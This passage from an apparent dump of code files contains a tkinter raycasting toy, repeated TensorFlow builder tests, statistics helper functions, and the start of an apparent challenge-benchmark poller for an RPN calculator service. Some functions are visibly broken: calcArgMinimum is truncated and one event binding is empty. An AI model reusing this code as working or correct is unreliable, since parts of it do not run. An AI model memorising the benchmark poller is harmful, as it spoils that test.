degrees']\n\ncanvas = tk.Canvas(root, width=rootx, height=rooty)\ncanvas.pack(anchor='nw')\ncanvas.configure(bg='black', borderwidth=0, highlightthickness=0)\ncanvas.update()\n\nCharacterAngle = 90\n\ndef makewalls():\n    a, b, c, d = 0,0,0,0\n    walls = []\n    for i in range(0, rootx*2+rooty*2):\n        if i < rootx:\n            a += 1\n            walls.append(f'{a},{0}')\n        elif i < rootx*2:\n            b += 1\n            walls.append(f'{b},{rooty}')\n        elif i < rootx*2+rooty:\n            c += 1\n            walls.append(f'{0},{c}')\n        else:\n            d += 1\n            walls.append(f'{rootx},{d}')\n\n    return walls\n\n\nWallsPos = makewalls()\nWallsPos.append('here ends the outer layer walls')\n\ndef calculateXYtoAdd(angle):\n    XY_to_add = [0, 0]\n    if angle == 90:\n        XY_to_add = [0, 90]\n    if angle == 180:\n        XY_to_add = [90, 0]\n    if angle == 270:\n        XY_to_add = [0, -90]\n    if angle == 360:\n        XY_to_add = [-90, 0]\n\n    if 0 < angle < 90:\n        XY_to_add = [angle-90, -90]\n    if 90 < angle < 180:\n        XY_to_add = [angle-90, 90]\n    if 180 < angle < 270:\n        XY_to_add = [90, angle-90]\n    if 270 < angle < 360:\n        XY_to_add = [-90, angle-90]\n\n    XY_to_add[0] = XY_to_add[0]/90\n    XY_to_add[1] = XY_to_add[1] / 90\n    return XY_to_add\n\ndef draw(pos):\n    canvas.create_rectangle(pos[0], pos[1], pos[0]+10, pos[1]+10, fill='white')\n    canvas.update()\n\n\nAllDistances = []\ndef calcDistance(pos, direction):\n    global AllDistances\n    AllDistances = []\n    calcPos = [0, 0]\n    calcAngle = (direction - 50)\n    distance = 0\n    for a in range(0, 100):\n        XY_add_calc = calculateXYtoAdd(calcAngle)\n        distance = 0\n        calcPos = CharacterXY\n\n        while(True):\n            calcPos[0] += XY_add_calc[0]\n            calcPos[1] += XY_add_calc[1]\n            distance += 1\n            if distance == 100:\n                something = 1\n            if f'{calcPos[0]},{calcPos[1]}' in WallsPos:\n                something = 1\n            else:\n                break\n\n        AllDistances.append(distance)\n        calcAngle += a\n\n\n\n\ndef jump():\n    aaaaa = \"aaaaaaaaaaaaaaaaaaaaaaaaa\"\n\n\n\n\ndef keydown(key):\n    global CharacterXY\n    global CharacterAngle\n\n    if key.char == 'w':\n        CharacterXY[1] -= 5\n        add = calculateXYtoAdd(CharacterAngle)\n        CharacterXY[0] += add[0]\n        CharacterXY[1] += add[1]\n        draw(CharacterXY)\n        #calcDistance(CharacterXY[0], CharacterXY[1])\n    if key.char == 'a':\n        CharacterAngle -= 1\n        #calcDistance(CharacterXY[0], CharacterXY[1])\n    if key.char == 's':\n        CharacterXY[1] += 5\n        add = calculateXYtoAdd(CharacterAngle)\n        CharacterXY[0] += add[0]\n        CharacterXY[1] += add[1]\n        draw(CharacterXY)\n        #calcDistance(CharacterXY[0], CharacterXY[1])\n    if key.char == 'd':\n        CharacterAngle += 1\n        #calcDistance(CharacterXY[0], CharacterXY[1])\n    if key.char == 'space':\n        jump\n\nroot.bind(\"\", keydown)\n\n\nroot.mainloop()", "220": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "221": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "222": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "223": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "224": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "225": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "226": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "227": "#%% Count\ndef countData(a):\n    c=0\n    for i in a:\n        if(i is not None):\n            c+=1\n            \n    return c\n\n#%% Describe\ndef descData(a):\n    \n    count=countData(a)\n    mean=calcMean(a)\n    std=calcStd(a)\n   \n    q1=calcQuantile(a,0.25)\n    median=calcQuantile(a,0.50)\n    q3=calcQuantile(a,0.75)\n    minimum=calcMinimum(a)\n    maximum=calcMaximum(a)\n        \n    print('Count'       , count)\n    print(\"Mean     %.6f\" %mean)\n    print('std      %.6f' %std)\n    print('min      %.6f' %minimum)\n    print('25%','      %.6f' %q1)\n    print('50%','      %.6f' %median)\n    print('75%','      %.6f' %q3)\n    print('max','      %.6f' %maximum)\n\n#%% Minimum\ndef calcMinimum(nums):\n    minimum = nums[0]\n    for num in nums:\n        if num < minimum:\n            minimum = num\n    return minimum\n    \n#%% Maximum\ndef calcMaximum(nums):\n    maximum = nums[0]\n    for num in nums:\n        if num > maximum:\n            maximum = num\n    return maximum\n\n#%% Arg Minimum\ndef calcArgMinimum(a):\n    min1=100000000000\n    for i in range(0,len(a)):\n        if(a[i]max1):\n            max1=a[i]\n            idx=i\n    return idx\n\n#%% Idx Minimum\ndef calcIdxMinimum(a):\n    mini=a[0]\n    min_index =0\n    for i in range(len(a)):\n        if (a[i] < mini):\n            mini=a[i]\n            min_index=i\n    return min_index\n    \n#%% Idx Maximum\ndef calcIdxMaximum(a):\n    mx=a[0]\n    max_index =0\n    for i in range(len(a)):\n        if (a[i] > mx):\n            mx=a[i]\n            max_index=i\n    return max_index\n\n\n#%% Quantile\ndef calcQuantile(a,q):\n    b=a\n    b=b.sort_values()\n    b=b.reset_index(drop=True)\n    n=len(b)\n    \n    return b[int(n*q)]\n\n#%% Sum\ndef calcSum(a):\n    sum=0\n    for i in a :\n        sum+=i\n    return sum\n\n#%% Mean\ndef calcMean(a):\n    sum=0\n    for i in a:\n        sum+=i\n        \n    n=len(a)\n    return sum/n\n\n#%% Median\ndef calcMedian(a):\n    median=0\n    a= sorted(a)  \n    n=len(a)\n    if n % 2 == 0:\n        median1 = a[n//2]\n        median2 = a[n//2 - 1]\n        median = (median1 + median2)/2\n    else:\n        median = a[n//2]\n    return median\n\n#%% Product\ndef calcProduct(nums):\n    product = 1\n    for num in nums:\n        product *= num\n    return product\n\n#%% Mean Absolute Deviation\ndef calcMad(nums):\n    mean = calcMean(nums)\n    n = len(nums)\n    result = 0\n    for num in nums:\n        result += abs(num - mean)\n    return result / n\n\n#%% Variance\ndef calcVariance(a):\n    M=calcMean(a)\n    var=0\n    for i in range(len(a)):\n        var = var + (a[i]-M)**2\n    result=var/(len(a)-1)\n    return result\n\n#%% Standard Deviation\ndef calcStd(a):\n    return (calcVariance(a)**0.5)\n\n#%% Skewness\ndef calcSkewness(a):\n    m=calcMean(a)\n    s=calcStd(a)\n    n=len(a)\n    \n    result=[(i-m)**3 for i in a]\n    sum1= calcSum(result)\n    \n    return (sum1/((n-1)*(s**3)))\n\n#%% Kurtosis\ndef calcKurtosis(nums):\n    mean = calcMean(nums)\n    std = calcStd(nums)\n    n = len(nums)\n    \n    result = [(num - mean) ** 4 for num in nums]\n    numerator = calcSum(result)\n    denominator = (n - 1) * (std ** 4)\n    \n    return numerator / denominator - 3\n\n#%% Cumulative Sum\ndef calcCumSum(a):\n    new_list=[]\n    j=0\n    for i in range(0,len(a)):\n        j=j+a[i]\n        new_list.append(j)\n    return new_list\n\n#%% Cumulative Minimum\ndef calcCumMin(nums):\n    result = []\n    for i in range(len(nums)):\n        if i == 0:\n            result.append(nums[i])\n        else:\n            result.append(min(result[i-1], nums[i]))\n    return result\n\n#%% Cumulative Maximum\ndef calcCumMax(a):\n    b=[]\n    c=[]\n    \n    for i in a:\n        b.append(i)\n        c.append(max(b))\n\n    return c\n\n#%% Cumulative Product\ndef calcCumProd(a):\n    a_list=[]\n    j=1\n    for i in a:\n        j=j * i\n        a_list.append(j)\n    return a_list\n\n#%% Print Cumulative Data\nimport time\ndef printCumulative(nums):\n    for i in range(len(nums)):\n        print(i, '  ', nums[i])\n\n\n#%% Arithmatic Difference\ndef calcDiff(a):\n    b=[None]\n    for i in range(1,len(a)):\n        b.append(a[i]-a[i-1])\n        \n    return b\n\n#%% Percent Changes\ndef calcPctChange(nums):\n    result = []\n    for i in range(len(nums)):\n        if i == 0:\n            result.append(None)\n        else:\n            result.append(round((nums[i] - nums[i-1]) / nums[i-1], 6))\n    return result\n\n", "228": "#!/usr/bin/env python\nfrom __future__ import division\n\nfrom generator.actions import Actions\n\nfrom numpy import int32, uint16\n\nimport copy\nimport math\nimport operator as op\nimport random\nimport re\n\n\ndef trace(fn):\n    def wrapper(*args, **kwargs):\n        fn(*args, **kwargs)\n    return wrapper\n\n\nclass TemplateGenerator(Actions):\n    line_regex = re.compile(r'(\\d+):\\s+(\\d+)?')\n    ERR_TOO_FEW_ARGS = \"Error: Too few arguments for '{}' command\"\n    ERR_INVALID_INPUT = \"Error: Invalid input\"\n\n    ADD_HISTORY = 1\n    NO_HISTORY = 2\n\n    class Stack(object):\n        def __init__(self):\n            self._storage = []\n\n        def pop(self):\n            return self._storage.pop()\n\n        def peek(self,):\n            return self._storage[-1]\n\n        def push(self, value):\n            return self._storage.append(value)\n\n        def invert(self):\n            self._storage.reverse()\n\n        def __len__(self):\n            return len(self._storage)\n\n        def copy(self):\n            return copy.deepcopy(self)\n\n    class CalcStack(Stack):\n        def pformat(self):\n            height = max(len(self._storage), 80)\n            padding = 80 - len(self._storage) if len(self._storage) < 80 else 0\n            return [\n                '{:03}:\\t{}'.format(height - i - 1, v)\n                for i, v in enumerate(\n                    ([''] * padding) + self._storage\n                )\n            ]\n\n    def _readln(self, s):\n        return self.read(expect=s + '\\n', delim='\\n')\n\n    def _writeln(self, s):\n        return self.write(s + '\\n')\n\n    def _parse_calc(self):\n        self.read(expect='\\x1b[2J\\x1b[H', length=len('\\x1b[2J\\x1b[H'))\n        # s = '\\n'.join([line for line in self.state['calc'].pformat()]) + '\\n'\n        # self.read(expect=s, length=len(s))\n        for line in self.state['calc'].pformat():\n            self._readln(line)\n\n        if self.state['err']:\n            self._readln(self.state['err'])\n        else:\n            self._readln('-' * 120)\n\n    def start(self):\n        #self.delay(100)\n        self.state['calc'] = self.CalcStack()\n        self.state['hist'] = self.Stack()\n        self.state['err'] = ''\n        self.state['ret'] = self.ADD_HISTORY\n        self.state['prev_stack'] = self.state['calc'].copy()\n\n        self.write(self.magic_page[:4])\n        self.read(length=0x1000, expect=self.magic_page)\n\n        for _ in xrange(8):\n            self.command()\n            self.implicit_push()\n\n    def command(self):\n        if not self.state['err'] and self.state['ret'] == self.ADD_HISTORY:\n            self.state['hist'].push(self.state['prev_stack'])\n        self.state['prev_stack'] = self.state['calc'].copy()\n\n        self._parse_calc()\n\n        self.state['err'] = ''\n        self.state['ret'] = self.ADD_HISTORY\n\n    def _ensure_n(self, cmd, n):\n        if len(self.state['calc']) < n:\n            self.state['err'] = self.ERR_TOO_FEW_ARGS.format(cmd)\n            return False\n        else:\n            return True\n\n    def _unop(self, name, oper):\n        cmd = name\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        self.state['calc'].push(int32(oper(self.state['calc'].pop())))\n\n    def _binop(self, name, oper, rev_args=False):\n        cmd = name\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 2):\n            return\n\n        v1, v2 = self.state['calc'].pop(), self.state['calc'].pop()\n        if rev_args:\n            self.state['calc'].push(int32(oper(v2, v1)))\n        else:\n            self.state['calc'].push(int32(oper(v1, v2)))\n\n    def implicit_push(self):\n        value = int32(random.randint(-(2 ** 31), 2 ** 31 - 1))\n        self._writeln(str(value))\n        self.state['calc'].push(value)\n\n    def explicit_push(self):\n        value = int32(random.randint(-(2 ** 31), 2 ** 31 - 1))\n        self._writeln(\"push {}\".format(value))\n        self.state['calc'].push(value)\n\n    def add(self):\n        self._binop('+', op.add)\n\n    def sub(self):\n        self._binop('-', op.sub, True)\n\n    def mul(self):\n        self._binop('*', op.mul)\n\n    def div(self):\n        cmd = '/'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 2):\n            return\n\n        v1, v2 = self.state['calc'].pop(), self.state['calc'].pop()\n        if v1 == 0:\n            self.state['err'] = self.ERR_INVALID_INPUT\n            self.state['calc'].push(v2)\n            self.state['calc'].push(v1)\n            return\n\n        self.state['calc'].push((int32(v2 / v1)))\n\n    def fact(self):\n        cmd = '!'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        v = self.state['calc'].pop()\n\n        if v < 0 or v > 1000:\n            self.state['err'] = self.ERR_INVALID_INPUT\n            self.state['calc'].push(v)\n            return\n\n        r = int32(1)\n        while v > 0:\n            r = int32(r * int32(v))\n            v -= 1\n        self.state['calc'].push(r)\n\n    def neg(self):\n        self._unop('neg', op.neg)\n\n    def abs(self):\n        self._unop('abs', op.abs)\n\n    def mod_(self):\n        cmd = 'mod'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 2):\n            return\n\n        v1, v2 = self.state['calc'].pop(), self.state['calc'].pop()\n        if v1 == 0:\n            self.state['err'] = self.ERR_INVALID_INPUT\n            self.state['calc'].push(v2)\n            self.state['calc'].push(v1)\n            return\n\n        self.state['calc'].push((int32(math.fmod(int32(v2), int32(v1)))))\n\n    def xor(self):\n        self._binop('^', op.xor)\n\n    def or_(self):\n        self._binop('|', op.or_)\n\n    def and_(self):\n        self._binop('&', op.and_)\n\n    def not_(self):\n        self._unop('~', lambda x: int32(~x))\n\n    def sum_(self):\n        cmd = 'sum'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        n = self.state['calc'].pop()\n\n        if len(self.state['calc']) < n or n < 0:\n            self.state['err'] = self.ERR_TOO_FEW_ARGS.format(cmd)\n            self.state['calc'].push(n)\n            return\n\n        s = int32(0)\n        for _ in xrange(n):\n            v = self.state['calc'].pop()\n            s = int32(int32(s) + int32(v))\n\n        self.state['calc'].push(s)\n\n    def avg(self):\n        cmd = 'avg'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        n = self.state['calc'].pop()\n        if n == 0:\n            self.state['err'] = self.ERR_INVALID_INPUT\n            self.state['calc'].push(n)\n            return\n\n        if len(self.state['calc']) < n or n < 0:\n            self.state['err'] = self.ERR_TOO_FEW_ARGS.format(cmd)\n            self.state['calc'].push(n)\n            return\n\n        s = int32(0)\n        for _ in xrange(n):\n            v = self.state['calc'].pop()\n            s = int32(int32(s) + int32(v))\n\n        self.state['calc'].push(int32(s 